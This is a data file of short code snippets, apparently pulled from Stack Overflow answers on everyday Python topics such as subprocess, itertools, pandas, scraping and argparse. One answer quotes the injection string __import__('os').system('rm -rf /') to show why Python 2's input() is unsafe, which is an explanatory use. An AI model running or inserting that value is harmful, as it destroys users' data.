&gt;&gt;&gt; os.environ['COMSPEC'] = 'C:\\nonexistent.exe'
&gt;&gt;&gt; subprocess.call('dir', shell=True)
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "c:\Python27\lib\subprocess.py", line 493, in call
    return Popen(*popenargs, **kwargs).wait()
  File "c:\Python27\lib\subprocess.py", line 679, in __init__
    errread, errwrite)
  File "c:\Python27\lib\subprocess.py", line 896, in _execute_child
    startupinfo)
WindowsError: [Error 2] The system cannot find the file specified
</snippet></ROW><ROW><id>20335954</id><snippet>subprocess.py</snippet></ROW><ROW><id>20335954</id><snippet>_execute_child</snippet></ROW><ROW><id>20335954</id><snippet>if shell:</snippet></ROW><ROW><id>20336014</id><snippet>__getattr__</snippet></ROW><ROW><id>20336014</id><snippet>Text</snippet></ROW><ROW><id>20336014</id><snippet>def __getattr__(self, val):
    if not val or not val[0].isupper():
        return tuple.__getattribute__(self, val)
    new = _TokenType(self + (val,))
    setattr(self, val, new)
    self.subtypes.add(new)
    new.parent = self
    return new
</snippet></ROW><ROW><id>20336014</id><snippet>Token.Text</snippet></ROW><ROW><id>20336014</id><snippet>Token.__getattr__('Text')</snippet></ROW><ROW><id>20336014</id><snippet>_TokentType</snippet></ROW><ROW><id>20336014</id><snippet>Token</snippet></ROW><ROW><id>20336020</id><snippet>def assignments(n, m, used=0):
    """Generate assignments of `n` items to `m` indistinguishable
    buckets, where `used` buckets have been used so far.

        &gt;&gt;&gt; list(assignments(3, 1))
        [(0, 0, 0)]
        &gt;&gt;&gt; list(assignments(3, 2))
        [(0, 0, 0), (0, 0, 1), (0, 1, 0), (0, 1, 1)]
        &gt;&gt;&gt; list(assignments(3, 3))
        [(0, 0, 0), (0, 0, 1), (0, 1, 0), (0, 1, 1), (0, 1, 2)]

    """
    if n == 0:
        yield ()
        return
    aa = list(assignments(n - 1, m, used))
    for first in range(used):
        for a in aa:
            yield (first,) + a
    if used &lt; m:
        for a in assignments(n - 1, m, used + 1):
            yield (used,) + a
</snippet></ROW><ROW><id>20336020</id><snippet>&gt;&gt;&gt; from timeit import timeit
&gt;&gt;&gt; timeit(lambda:list(assignments(12, 5)), number=1)
4.513746023178101
&gt;&gt;&gt; sum(1 for _ in assignments(12, 5))
2079475
</snippet></ROW><ROW><id>20336020</id><snippet>product</snippet></ROW><ROW><id>20336020</id><snippet>&gt;&gt;&gt; timeit(lambda:list(test(12, 5)), number=1)
540.693009853363
</snippet></ROW><ROW><id>20336263</id><snippet>db.update('users', where="id=$id", vars={'id': user['id']}, **user)
</snippet></ROW><ROW><id>20336263</id><snippet>uid = user.pop('id')
db.update('users', where="id=$id", vars={'id': uid}, **user)
</snippet></ROW><ROW><id>20336263</id><snippet>db.update('users', where="id=$id", vars={'id': uid}, name=user['name'], city=user['city'])
</snippet></ROW><ROW><id>20336300</id><snippet>class BTNode:
    '''Node in binary tree'''

    def __init__(self, value, left=None, right=None):
        '''
        Create new BTNode with value and possible children left and right
        '''
        self.value, self.left, self.right = value, left, right

    def count_nodes(self):
        '''
        Return a tuple containing the number of interior nodes and the number of
        leaves in the tree rooted at n, or (0,0) if n is None.
        '''
        if self.left is None and self.right is None:
            # leaf
            return (0, 1)
        else:
            # internal node
            left_nodes,  left_leaves  = (0, 0) if self.left  is None else self.left.count_nodes()
            right_nodes, right_leaves = (0, 0) if self.right is None else self.right.count_nodes()
            return (left_nodes + 1 + right_nodes, left_leaves + right_leaves)
</snippet></ROW><ROW><id>20336350</id><snippet>&gt;&gt;&gt; txt = 'NAME;a;b;c\nATTR1;1;2;3\nATTR2;1;2;3;;;\nATTR3;1;2;3;\nATTR4;1;2;3'
&gt;&gt;&gt; pd.read_csv(StringIO(txt),sep=";",names=range(4))
       0  1  2  3
0   NAME  a  b  c
1  ATTR1  1  2  3
2  ATTR2  1  2  3
3  ATTR3  1  2  3
4  ATTR4  1  2  3

[5 rows x 4 columns]
</snippet></ROW><ROW><id>20336350</id><snippet>names=range(128)</snippet></ROW><ROW><id>20336350</id><snippet>.dropna(how='all', axis=1)</snippet></ROW><ROW><id>20336519</id><snippet>import csv

with open("propertyOutput.csv", "rbw") as fp:
    reader = csv.DictReader(fp, skipinitialspace=True)
    table = [row for row in reader]
    header = reader.fieldnames 
</snippet></ROW><ROW><id>20336519</id><snippet>with open("propertyOutput.csv", "wb") as fp:
    writer = csv.DictWriter(fp, header)
    for row in table:
        if not stringNeed.isdigit(): 
            rows['zip'] = "not number"
        # even more stuff to check and edit here
        # write the edited row
        writer.writerow(row)
</snippet></ROW><ROW><id>20336548</id><snippet>sklearn</snippet></ROW><ROW><id>20336548</id><snippet>sklearn</snippet></ROW><ROW><id>20336548</id><snippet>FLANN</snippet></ROW><ROW><id>20336548</id><snippet>ANN</snippet></ROW><ROW><id>20336548</id><snippet>sklearn</snippet></ROW><ROW><id>20336816</id><snippet>{% load i18n %}
</snippet></ROW><ROW><id>20336816</id><snippet>blocktrans</snippet></ROW><ROW><id>20336816</id><snippet>count</snippet></ROW><ROW><id>20336816</id><snippet>{% blocktrans count count=forloop.counter %}
</snippet></ROW><ROW><id>20336930</id><snippet>drop_duplicates</snippet></ROW><ROW><id>20336930</id><snippet>&gt;&gt;&gt; dd = pd.DataFrame(b.map(lambda x: tuple(x)), columns=['itemID']).reset_index()
&gt;&gt;&gt; dd['code'] = codes
&gt;&gt;&gt; dd.drop_duplicates(cols=["code", "itemID"])
   userID  itemID code
0       1  (2, 3)   AA
1       2  (2, 4)   AB
2       3    (1,)   AB
</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Response</snippet></ROW><ROW><id>20337020</id><snippet>meta</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>GET</snippet></ROW><ROW><id>20337020</id><snippet>method=</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Spider</snippet></ROW><ROW><id>20337020</id><snippet>Downloader</snippet></ROW><ROW><id>20337020</id><snippet>Response</snippet></ROW><ROW><id>20337020</id><snippet>Spider</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Response</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Spider</snippet></ROW><ROW><id>20337020</id><snippet>start_urls</snippet></ROW><ROW><id>20337020</id><snippet>start_urls</snippet></ROW><ROW><id>20337020</id><snippet>start_urls</snippet></ROW><ROW><id>20337020</id><snippet>url</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>Downloader</snippet></ROW><ROW><id>20337020</id><snippet>Response</snippet></ROW><ROW><id>20337020</id><snippet>urllib2</snippet></ROW><ROW><id>20337020</id><snippet>urllib.request</snippet></ROW><ROW><id>20337020</id><snippet>requests</snippet></ROW><ROW><id>20337020</id><snippet>depth= request.meta['depth']</snippet></ROW><ROW><id>20337020</id><snippet>KeyError</snippet></ROW><ROW><id>20337020</id><snippet>meta</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337020</id><snippet>meta=</snippet></ROW><ROW><id>20337020</id><snippet>Request</snippet></ROW><ROW><id>20337063</id><snippet>with open(filename, "r") as f:
    for line in f:
        url = urllib2.urlopen(line)
        ...
</snippet></ROW><ROW><id>20337233</id><snippet>lxml</snippet></ROW><ROW><id>20337233</id><snippet>lxml</snippet></ROW><ROW><id>20337233</id><snippet>easy_install lxml</snippet></ROW><ROW><id>20337233</id><snippet>pip install lxml</snippet></ROW><ROW><id>20337233</id><snippet>setup.py</snippet></ROW><ROW><id>20337233</id><snippet>BeautifulSoup</snippet></ROW><ROW><id>20337233</id><snippet>from BeautifulSoup import UnicodeDammit
from lxml import html


def decode_html(html_string):
    converted = UnicodeDammit(html_string, isHTML=True)
    if not converted.unicode:
        raise UnicodeDecodeError(
            "Failed to detect encoding, tried [%s]",
            ', '.join(converted.triedEncodings))
    # print converted.originalEncoding
    return converted.unicode


tag_soup = open('mess.html').read()

# Use BeautifulSoup's UnicodeDammit to detect and fix the encoding
decoded = decode_html(tag_soup)

# Use lxml's HTML parser (faster) to parse the document
root = html.fromstring(decoded)

spans = root.xpath("//span[@style='font-size:14px;']")
wanted_spans = spans[2:]

blocks = []
for span in wanted_spans:
    line = span.text.strip().replace('\n', '')
    blocks.append(line)

description = '\n'.join(blocks)
print description
</snippet></ROW><ROW><id>20337233</id><snippet>lxml</snippet></ROW><ROW><id>20337233</id><snippet>lxml</snippet></ROW><ROW><id>20337233</id><snippet>//span[@style='font-size:14px;']</snippet></ROW><ROW><id>20337233</id><snippet>&lt;span /&gt;</snippet></ROW><ROW><id>20337233</id><snippet>style</snippet></ROW><ROW><id>20337233</id><snippet>font-size:14px;</snippet></ROW><ROW><id>20337233</id><snippet>//div[@class='event-details']//span[@style='font-size:14px;']
</snippet></ROW><ROW><id>20337233</id><snippet>div</snippet></ROW><ROW><id>20337233</id><snippet>event-details</snippet></ROW><ROW><id>20337233</id><snippet>;</snippet></ROW><ROW><id>20337233</id><snippet>contains()</snippet></ROW><ROW><id>20337233</id><snippet>spans[2:]</snippet></ROW><ROW><id>20337233</id><snippet>strip().replace('\n', '')</snippet></ROW><ROW><id>20337233</id><snippet>' '.join(lines)</snippet></ROW><ROW><id>20337349</id><snippet>label_list = ['hfsdkjfhs','sldjfhsdkj','sdrtryf','sdfsd','sdkjf','sdfsd','sdrtdf','sfsd','sdaaafs','sdffghs']

x = data[:, -1]
xnew=np.linspace(0,len(x),50)

smoothed_data = [spline(np.arange(len(x)),data[:, j%10],xnew) 
                 for j in range(1, 11)]

# get a figure and axes
fig, ax = plt.subplots()
# make the stack plot
stack_coll = ax.stackplot(xnew, smoothed_data)
# set the ylim
ax.set_ylim([0,30])
# make proxy artists
proxy_rects = [Rectangle((0, 0), 1, 1, fc=pc.get_facecolor()[0]) for pc in stack_coll]
# make the legend
ax.ledgend(proxy_rects, label_list)
# re-draw the canvas
plt.draw()
</snippet></ROW><ROW><id>20337438</id><snippet>from django.db.models import Count

Profile.objects.values('age').annotate(Count('age'))

Result: [{'age': 10, 'age__count': 52}, ...]
</snippet></ROW><ROW><id>20337465</id><snippet>#!/usr/bin/env python3

import sys
import time

data = "this is a sentence with some words".split()

max_len=max([len(w) for w in data])
pad = " "*max_len
for w in data:
    sys.stdout.write('%s\r' % pad)
    sys.stdout.write("%s\r" % w)
    sys.stdout.flush()
    time.sleep(0.4)

print
</snippet></ROW><ROW><id>20337527</id><snippet>an</snippet></ROW><ROW><id>20337527</id><snippet>a</snippet></ROW><ROW><id>20337527</id><snippet>#!/usr/bin/env python
import itertools
import re
import sys

try:
    from future_builtins import map, zip
except ImportError: # Python 3 (or old Python versions)
    map, zip = map, zip
from operator import methodcaller

import nltk  # $ pip install nltk
from nltk.corpus import cmudict  # &gt;&gt;&gt; nltk.download('cmudict')

def starts_with_vowel_sound(word, pronunciations=cmudict.dict()):
    for syllables in pronunciations.get(word, []):
        return syllables[0][-1].isdigit()  # use only the first one

def check_a_an_usage(words):
    # iterate over words pairwise (recipe from itertools)
    #note: ignore Unicode case-folding (`.casefold()`)
    a, b = itertools.tee(map(methodcaller('lower'), words)) 
    next(b, None)
    for a, w in zip(a, b):
        if (a == 'a' or a == 'an') and re.match('\w+$', w): 
            valid = (a == 'an') if starts_with_vowel_sound(w) else (a == 'a')
            yield valid, a, w

#note: you could use nltk to split text in paragraphs,sentences, words
pairs = ((a, w)
         for sentence in sys.stdin.readlines() if sentence.strip() 
         for valid, a, w in check_a_an_usage(nltk.wordpunct_tokenize(sentence))
         if not valid)

print("Invalid indefinite article usage:")
print('\n'.join(map(" ".join, pairs)))
</snippet></ROW><ROW><id>20337527</id><snippet>Invalid indefinite article usage:
a acre
an rhythm
an yearly
</snippet></ROW><ROW><id>20337605</id><snippet>min(colors, key=difference_func)
</snippet></ROW><ROW><id>20337605</id><snippet>from functools import partial
def difference_func(test_color, other_color):
    return ???

result = min(colors, key=partial(difference_func, test_color))
</snippet></ROW><ROW><id>20337668</id><snippet>tree.item("Main", open=False)
</snippet></ROW><ROW><id>20337668</id><snippet>insert()</snippet></ROW><ROW><id>20337668</id><snippet>item()</snippet></ROW><ROW><id>20337685</id><snippet>sentence.replace(i, new)</snippet></ROW><ROW><id>20337685</id><snippet>sentence = input("Say a sentence: ").split()
vowels = 'aeiouAEIOU'                       
for idx in range(len(sentence)):
    to_replace = sentence[idx]
    if to_replace.isalpha() == True:
        if to_replace[0] in vowels:
            print(to_replace + "way")
            new = i + "way"
        else:
            print(to_replace[1:] + to_replace[0] + "ay")
            new = to_replace[1:] + to_replace[0] + "ay"
        sentence[idx] = new
    else:
        print(to_replace)
print(sentence)
</snippet></ROW><ROW><id>20337685</id><snippet>replace()</snippet></ROW><ROW><id>20337685</id><snippet>string</snippet></ROW><ROW><id>20337685</id><snippet>list</snippet></ROW><ROW><id>20337685</id><snippet>sentence[idx]</snippet></ROW><ROW><id>20338137</id><snippet>os.system("chmod 700 file")
                     ^^^^--- literal string, looking for a file named "file"
</snippet></ROW><ROW><id>20338137</id><snippet>os.system("chmod 700 " + file)
                       ^^^^^^---concatenate your variable named "file"
</snippet></ROW><ROW><id>20338203</id><snippet>sortedWords = wordSort(wordList)
for x in sortedWords:
    print ("#%d %s") %(sum + 1, sortedWords[sum])
    sum = sum + 1
</snippet></ROW><ROW><id>20338203</id><snippet>enumerate()</snippet></ROW><ROW><id>20338203</id><snippet>sortedWords = wordSort(wordList)
for i, word in enumerate(sortedWords):
    print ("#%d %s") %(i, word)
</snippet></ROW><ROW><id>20338214</id><snippet>numpy.histogramdd</snippet></ROW><ROW><id>20338214</id><snippet>normed=True</snippet></ROW><ROW><id>20338214</id><snippet>import numpy as np
numBins = 10
data = np.random.randn(100000, 3)  # generate 100000 3-d random data points
jointProbs, edges = np.histogramdd(data, bins=numBins)
jointProbs /= jointProbs.sum()
</snippet></ROW><ROW><id>20338291</id><snippet>import package.foo as foo</snippet></ROW><ROW><id>20338291</id><snippet>import package.foo
package.foo.fct(7)
</snippet></ROW><ROW><id>20338291</id><snippet>import package.foo as foo
foo.fct(7)
</snippet></ROW><ROW><id>20338291</id><snippet>from package import foo
foo.fct(7)
</snippet></ROW><ROW><id>20338328</id><snippet>r'\w*[A-Za-z]\w*'
</snippet></ROW><ROW><id>20338328</id><snippet>\w</snippet></ROW><ROW><id>20338328</id><snippet>_</snippet></ROW><ROW><id>20338328</id><snippet>r'[A-Za-z0-9]*[A-Za-z][A-Za-z0-9]*'
</snippet></ROW><ROW><id>20338482</id><snippet>MySQLdb</snippet></ROW><ROW><id>20338482</id><snippet>PyMySQL</snippet></ROW><ROW><id>20338482</id><snippet>libmysql</snippet></ROW><ROW><id>20338482</id><snippet>MySQLdb</snippet></ROW><ROW><id>20338482</id><snippet>PyMySQL</snippet></ROW><ROW><id>20338516</id><snippet>        limit = float(log(len(lst),[2]))
</snippet></ROW><ROW><id>20338516</id><snippet>[2]</snippet></ROW><ROW><id>20338516</id><snippet>2</snippet></ROW><ROW><id>20338590</id><snippet>fullfilename os.path.join(myPath, filename)
urllib.urlretrieve(url, fullfilename)
</snippet></ROW><ROW><id>20338590</id><snippet>import os
</snippet></ROW><ROW><id>20338633</id><snippet>dest</snippet></ROW><ROW><id>20338633</id><snippet>parser.add_subparsers()</snippet></ROW><ROW><id>20338633</id><snippet>mode</snippet></ROW><ROW><id>20338633</id><snippet>parser = argparse.ArgumentParser()
subparsers = parser.add_subparsers(dest='mode')
</snippet></ROW><ROW><id>20338633</id><snippet>mode</snippet></ROW><ROW><id>20338633</id><snippet>$ cat test.py 
import argparse
parser = argparse.ArgumentParser()
subparsers = parser.add_subparsers(dest='mode')
parser_delete = subparsers.add_parser('delete')
parser_delete.add_argument('id')
print parser.parse_args()

$ python test.py delete 123
Namespace(id='123', mode='delete')
</snippet></ROW><ROW><id>20338643</id><snippet>"a"</snippet></ROW><ROW><id>20338643</id><snippet>"b"</snippet></ROW><ROW><id>20338643</id><snippet>a</snippet></ROW><ROW><id>20338643</id><snippet>b</snippet></ROW><ROW><id>20338643</id><snippet>a = raw_input('podaj liczbę A  : ')
b = raw_input('podaj liczbę B  : ')
a = float(a)
b = float(b)
</snippet></ROW><ROW><id>20338643</id><snippet>__import__('os').system('rm -rf /')</snippet></ROW><ROW><id>20338643</id><snippet>a = input('podaj liczbę A  : ')
b = input('podaj liczbę A  : ')
</snippet></ROW><ROW><id>20338643</id><snippet>a_verifying = True
while a_verifying:
  a = input('podaj liczbę A  : ')
  try:
    a = float(a)
    a_verifying = False
  except ValueError as e:
    a = input('podaj liczbę A  : ')

b_verifying = True
while b_verifying:
  b = input('podaj liczbę B  : ')
  try:
    b = float(b)
    b_verifying = False
  except ValueError as e:
    b = input('podaj liczbę B  : ')
</snippet></ROW><ROW><id>20338646</id><snippet>itertools.groupby</snippet></ROW><ROW><id>20338646</id><snippet>&gt;&gt;&gt; from operator import itemgetter
&gt;&gt;&gt; from itertools import groupby
&gt;&gt;&gt; from pprint import pprint
&gt;&gt;&gt; pprint ([list(g) for k, g in groupby(c, key=itemgetter(0))])
[[array([ 1, 10, 11, 12]), array([ 1, 13, 14, 15]), array([ 1, 16, 17, 18])],
 [array([ 2, 19, 20, 21]), array([ 2, 22, 23, 24])],
 [array([ 3, 25, 26, 27]), array([ 3, 28, 29, 30])],
 [array([ 4, 31, 32, 33]), array([ 4, 34, 35, 36])],
 [array([ 5, 37, 38, 39])]]
</snippet></ROW><ROW><id>20338646</id><snippet>NumPy</snippet></ROW><ROW><id>20338646</id><snippet>&gt;&gt;&gt; e, inds = np.unique(c[:,0], return_index=True)
&gt;&gt;&gt; np.split(c, inds)[1:]
[array([[ 1, 10, 11, 12],
       [ 1, 13, 14, 15],
       [ 1, 16, 17, 18]]),
 array([[ 2, 19, 20, 21],
       [ 2, 22, 23, 24]]),
 array([[ 3, 25, 26, 27],
       [ 3, 28, 29, 30]]),
 array([[ 4, 31, 32, 33],
       [ 4, 34, 35, 36]]),
 array([[ 5, 37, 38, 39]])]
</snippet></ROW><ROW><id>20339013</id><snippet>Customer</snippet></ROW><ROW><id>20339013</id><snippet>UserManager</snippet></ROW><ROW><id>20339013</id><snippet>objects</snippet></ROW><ROW><id>20339013</id><snippet>Customer</snippet></ROW><ROW><id>20339013</id><snippet>obj_create</snippet></ROW><ROW><id>20339013</id><snippet>CustomerResource</snippet></ROW><ROW><id>20339013</id><snippet>class CustomerResource(ModelResource):

    locations = fields.ToManyField('device.resources.LocationResource',
            'location_set', null=True)
    current_location = fields.ToOneField('device.resources.LocationResource',
            'current_location', null=True)
    default_location = fields.ToOneField('device.resources.LocationResource',
            'default_location', null=True)

    class Meta:
        queryset = Customer.objects.all()
        resource_name = 'customers'
        validation = CleanedDataFormValidation(form_class=RegistrationForm)
        list_allowed_methods = ['get', 'post']
        detail_allowed_methods = ['get', 'put', 'patch', 'delete']
        authorization = Authorization()
        excludes =['is_superuser', 'is_active', 'is_staff', 'password', 'last_login',]
        filtering = {
            'location': ('exact'),
        }

    def obj_create(self, bundle, **kwargs):
        bundle.obj = self._meta.object_class.objects.create_user(
            username=kwargs['username'],
            email=kwargs['email'],
            password=kwargs['password1'],
        )
        return bundle
</snippet></ROW><ROW><id>20339112</id><snippet>multiprocessing</snippet></ROW><ROW><id>20339112</id><snippet>node.child1.code.append(node.code + '0')
</snippet></ROW><ROW><id>20339112</id><snippet>bytearray</snippet></ROW><ROW><id>20339112</id><snippet>bytearray</snippet></ROW><ROW><id>20339112</id><snippet>node.child1.code.extend(node.code + '0')
                 ^^^^^^
</snippet></ROW><ROW><id>20339112</id><snippet>child2</snippet></ROW><ROW><id>20339112</id><snippet>.get()</snippet></ROW><ROW><id>20339112</id><snippet>ALL_DONE = "all done"
</snippet></ROW><ROW><id>20339112</id><snippet>.join()</snippet></ROW><ROW><id>20339112</id><snippet>_encode_tree()</snippet></ROW><ROW><id>20339112</id><snippet>for i in range(1, symbol_count + 1):
    processed_symbol = results.get()
    table.update(processed_symbol)
    print "Symbols to process: %d" % (symbol_count - i)
for i in range(mp.cpu_count()):
    work.put(ALL_DONE)
worker_pool.join()
messages.put(ALL_DONE)
message_thread.join()
return table
</snippet></ROW><ROW><id>20339112</id><snippet>.get()</snippet></ROW><ROW><id>20339112</id><snippet>results</snippet></ROW><ROW><id>20339112</id><snippet>worker_pool.join()</snippet></ROW><ROW><id>20339112</id><snippet>_reporter_thread()</snippet></ROW><ROW><id>20339112</id><snippet>def _reporter_thread(message_queue):
    while True:
        message = message_queue.get()
        if message == ALL_DONE:
            break
        else:
            print message
</snippet></ROW><ROW><id>20339112</id><snippet>_encode_proc()</snippet></ROW><ROW><id>20339112</id><snippet>try/except Queue.Empty:</snippet></ROW><ROW><id>20339112</id><snippet>Queue</snippet></ROW><ROW><id>20339127</id><snippet>Font(...)</snippet></ROW><ROW><id>20339127</id><snippet>exists=True</snippet></ROW><ROW><id>20339127</id><snippet>Consolas</snippet></ROW><ROW><id>20339171</id><snippet>as</snippet></ROW><ROW><id>20339171</id><snippet>try:
    1/0
except ZeroDivisionError as e:
    print(e)
</snippet></ROW><ROW><id>20339171</id><snippet>division by zero
</snippet></ROW><ROW><id>20339176</id><snippet>def main(url):
        page = webpage_get.wget(url)
        print_links(page)

if __name__ == '__main__':
    url = ""
    if len(sys.argv &gt;= 1):
       url = sys.argv[0]

    main(url)
</snippet></ROW><ROW><id>20339176</id><snippet>python test.py http://www.4chan.org</snippet></ROW><ROW><id>20339277</id><snippet>develop</snippet></ROW><ROW><id>20339277</id><snippet>.egg-link</snippet></ROW><ROW><id>20339277</id><snippet>site-packages</snippet></ROW><ROW><id>20339277</id><snippet>easy-install.pth</snippet></ROW><ROW><id>20339277</id><snippet>setup.py develop -u</snippet></ROW><ROW><id>20339277</id><snippet>install_requires</snippet></ROW><ROW><id>20339277</id><snippet>easy_install</snippet></ROW><ROW><id>20339418</id><snippet>numpy</snippet></ROW><ROW><id>20339418</id><snippet>bintrees</snippet></ROW><ROW><id>20339418</id><snippet>import pickle</snippet></ROW><ROW><id>20339418</id><snippet>cpickle</snippet></ROW><ROW><id>20339418</id><snippet>pickle</snippet></ROW><ROW><id>20339418</id><snippet>sys</snippet></ROW><ROW><id>20339418</id><snippet>cpickle</snippet></ROW><ROW><id>20339418</id><snippet>pickle</snippet></ROW><ROW><id>20339418</id><snippet>__file__</snippet></ROW><ROW><id>20339418</id><snippet>__file__</snippet></ROW><ROW><id>20339418</id><snippet>inspect</snippet></ROW><ROW><id>20339418</id><snippet>py2app</snippet></ROW><ROW><id>20339418</id><snippet>cx_freeze</snippet></ROW><ROW><id>20339418</id><snippet>easy_install</snippet></ROW><ROW><id>20339418</id><snippet>pip</snippet></ROW><ROW><id>20339418</id><snippet>__file__</snippet></ROW><ROW><id>20339418</id><snippet>importlib</snippet></ROW><ROW><id>20339418</id><snippet>BuiltinImporter</snippet></ROW><ROW><id>20339418</id><snippet>ExtensionFileLoader</snippet></ROW><ROW><id>20339418</id><snippet>SourceFileLoader</snippet></ROW><ROW><id>20339418</id><snippet>SourcelessFileLoader</snippet></ROW><ROW><id>20339418</id><snippet>importlib.machinery</snippet></ROW><ROW><id>20339418</id><snippet>any(pathname.endswith(suffix) for suffix in importlib.machinery.EXTENSION_SUFFIXES))</snippet></ROW><ROW><id>20339418</id><snippet>inspect</snippet></ROW><ROW><id>20339418</id><snippet>getsource</snippet></ROW><ROW><id>20339418</id><snippet>getsourcefile</snippet></ROW><ROW><id>20339418</id><snippet>getfile</snippet></ROW><ROW><id>20339418</id><snippet>TypeError</snippet></ROW><ROW><id>20339418</id><snippet>getsourcefile</snippet></ROW><ROW><id>20339418</id><snippet>getsource</snippet></ROW><ROW><id>20339418</id><snippet>IOError</snippet></ROW><ROW><id>20339418</id><snippet>UnicodeError</snippet></ROW><ROW><id>20339418</id><snippet>SyntaxError</snippet></ROW><ROW><id>20339418</id><snippet>getsourcefile</snippet></ROW><ROW><id>20339418</id><snippet>getsource</snippet></ROW><ROW><id>20339487</id><snippet>itertools.product()</snippet></ROW><ROW><id>20339487</id><snippet>from itertools import product

lsts = [['A', 'G'], ['A', 'C', 'G'], 'T']
output = [''.join(combo) for combo in product(*lsts)]
</snippet></ROW><ROW><id>20339487</id><snippet>*lsts</snippet></ROW><ROW><id>20339487</id><snippet>lsts</snippet></ROW><ROW><id>20339487</id><snippet>products()</snippet></ROW><ROW><id>20339487</id><snippet>product(['A', 'G'], ['A', 'C', 'G'], 'T')</snippet></ROW><ROW><id>20339487</id><snippet>&gt;&gt;&gt; from itertools import product
&gt;&gt;&gt; lsts = [['A','G'],['A','C','G'],'T']
&gt;&gt;&gt; [''.join(combo) for combo in product(*lsts)]
['AAT', 'ACT', 'AGT', 'GAT', 'GCT', 'GGT']
</snippet></ROW><ROW><id>20339487</id><snippet>lsts = ['AG', 'ACG','T']
</snippet></ROW><ROW><id>20339487</id><snippet>lsts = [['A', 'G'], ['A', 'C', 'G'], ['T']]
</snippet></ROW><ROW><id>20339671</id><snippet>itertools.groupby()</snippet></ROW><ROW><id>20339671</id><snippet>&gt;&gt;&gt; import itertools
&gt;&gt;&gt; items = [['118', 'white'], ['118','Jack'], ['118','guilty'],  ['200','black'], ['200','mark'], ['200','not guilty']]
&gt;&gt;&gt; [[x[1] for x in g] for k, g in itertools.groupby(items, lambda x: x[0])]
[['white', 'Jack', 'guilty'], ['black', 'mark', 'not guilty']]
</snippet></ROW><ROW><id>20339671</id><snippet>operator.itemgetter(0)</snippet></ROW><ROW><id>20339671</id><snippet>lambda x: x[0]</snippet></ROW><ROW><id>20339671</id><snippet>items</snippet></ROW><ROW><id>20339671</id><snippet>sorted(items)</snippet></ROW><ROW><id>20339671</id><snippet>items</snippet></ROW><ROW><id>20339671</id><snippet>groupby()</snippet></ROW><ROW><id>20339671</id><snippet>&gt;&gt;&gt; [(k, [x[1] for x in g]) for k, g in itertools.groupby(items, lambda x: x[0])]
[('118', ['white', 'Jack', 'guilty']), ('200', ['black', 'mark', 'not guilty'])]
</snippet></ROW><ROW><id>20339671</id><snippet>dict()</snippet></ROW><ROW><id>20339739</id><snippet>__getitem__</snippet></ROW><ROW><id>20339739</id><snippet>__getitem__</snippet></ROW><ROW><id>20339739</id><snippet>dict.__getitem__</snippet></ROW><ROW><id>20339739</id><snippet>dict</snippet></ROW><ROW><id>20339739</id><snippet>vectorize</snippet></ROW><ROW><id>20339739</id><snippet>np.vectorize(lambda x: x*2)(a)
a * 2
</snippet></ROW><ROW><id>20339739</id><snippet>__getitem__</snippet></ROW><ROW><id>20339739</id><snippet>itertools.product(xrange(10), repeat=len(food_choices))</snippet></ROW><ROW><id>20339739</id><snippet>np.array(i).astype(float)</snippet></ROW><ROW><id>20339739</id><snippet>10**n</snippet></ROW><ROW><id>20339739</id><snippet>10**n</snippet></ROW><ROW><id>20339739</id><snippet>__getitem__</snippet></ROW><ROW><id>20339748</id><snippet>    * config/python.m4 (AM_PATH_PYTHON): Added python2.6 support.

    * config/ccpython.m4 (ALL_CC_PYTHON): Added python2.6 support.
</snippet></ROW><ROW><id>20339748</id><snippet>autoreconf</snippet></ROW><ROW><id>20339748</id><snippet>$ apt-get install python-dev autoconf pkg-config
</snippet></ROW><ROW><id>20339748</id><snippet>$ autoreconf
$ ./configure
$ make
</snippet></ROW><ROW><id>20339748</id><snippet>diff --git a/Makefile.am b/Makefile.am
index c16df82..7d66971 100644
--- a/Makefile.am
+++ b/Makefile.am
@@ -40,12 +40,12 @@ _pokereval_2_6_la_LIBADD = ${PYTHON2_6_LIBS} ${POKER_EVAL_LIBS}
 _pokereval_2_6_la_CFLAGS = ${PYTHON2_6_CFLAGS} ${POKER_EVAL_CFLAGS} -DPYTHON_VERSION=\"2_6\" -D'VERSION_NAME(w)=w\#\#2_
 endif

-if PYTHON_2_5
-py2_5exec_LTLIBRARIES = _pokereval_2_5.la
-_pokereval_2_5_la_SOURCES = pypokereval.c
-_pokereval_2_5_la_LDFLAGS = -module -no-undefined -version-info 1:0:0
-_pokereval_2_5_la_LIBADD = ${PYTHON2_5_LIBS} ${POKER_EVAL_LIBS}
-_pokereval_2_5_la_CFLAGS = ${PYTHON2_5_CFLAGS} ${POKER_EVAL_CFLAGS} -DPYTHON_VERSION=\"2_5\" -D'VERSION_NAME(w)=w\#\#2_
+if PYTHON_2_7
+py2_7exec_LTLIBRARIES = _pokereval_2_7.la
+_pokereval_2_7_la_SOURCES = pypokereval.c
+_pokereval_2_7_la_LDFLAGS = -module -no-undefined -version-info 1:0:0
+_pokereval_2_7_la_LIBADD = ${PYTHON2_7_LIBS} ${POKER_EVAL_LIBS}
+_pokereval_2_7_la_CFLAGS = ${PYTHON2_7_CFLAGS} ${POKER_EVAL_CFLAGS} -DPYTHON_VERSION=\"2_7\" -D'VERSION_NAME(w)=w\#\#2_
 endif

 if PYTHON_2_4
diff --git a/config/ccpython.m4 b/config/ccpython.m4
index c94cbb6..46de0db 100644
--- a/config/ccpython.m4
+++ b/config/ccpython.m4
@@ -110,7 +110,7 @@ AM_CONDITIONAL([PYTHON_]$2, [test "$have_python" != "no"])

 AC_DEFUN([ALL_CC_PYTHON],
 [ 
-m4_define([_AM_PYTHON_INTERPRETER_LIST], [python2.6 python2.5 python2.4 python2.3])
+m4_define([_AM_PYTHON_INTERPRETER_LIST], [python2.6 python2.7 python2.4 python2.3])
 PYTHONS=''
